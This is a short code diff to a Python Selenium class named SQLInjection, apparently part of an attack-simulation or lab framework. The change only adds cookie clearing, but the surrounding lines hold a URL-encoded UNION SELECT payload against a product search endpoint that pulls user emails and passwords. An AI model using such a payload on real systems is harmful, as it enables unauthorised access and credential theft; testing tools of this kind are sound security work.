@@ -40,6 +40,7 @@ class SQLInjection(Attack):
 
     def run(self):
         driver = webdriver.Chrome(options=self.chrome_options)
+        driver.delete_all_cookies()
         time.sleep(2)
         sql_query = "/rest/products/search?q=qwert%27%29%29%20" \
             "UNION%20SELECT%20id%2C%20email%2C%20password%2C%2" \
@@ -51,6 +52,7 @@ class SQLInjection(Attack):
 
     def run_tryhard(self):
         driver = webdriver.Chrome(options=self.chrome_options)
+        driver.delete_all_cookies()
         driver.get(self.base_url)
         time.sleep(2)
         driver.get(self.base_url + "/rest/products/search?q=")
